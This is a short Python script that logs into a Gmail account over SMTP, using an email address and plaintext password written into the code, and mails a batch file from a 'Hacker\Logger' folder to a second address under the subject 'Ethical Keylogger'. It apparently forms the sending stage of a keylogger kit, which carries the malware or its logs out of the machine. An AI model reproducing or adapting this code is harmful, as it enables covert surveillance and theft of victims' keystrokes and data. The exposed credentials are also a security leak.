import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

email_user = 'ohmygod22052009@gmail.com'
email_send = 'giahung13112013@gmail.com'
email_password = 'Dannz2205459'
subject = 'Ethical Keylogger'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Here is the keylogger.'
msg.attach(MIMEText(body,'plain'))

filename = 'D:\\Do not open\\Hacker\\Logger\\a.bat' #INSERT FILE LOCATION
attachment = open(filename, 'rb')

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(email_user, email_password)


server.sendmail(email_user, email_send, text)
server.quit()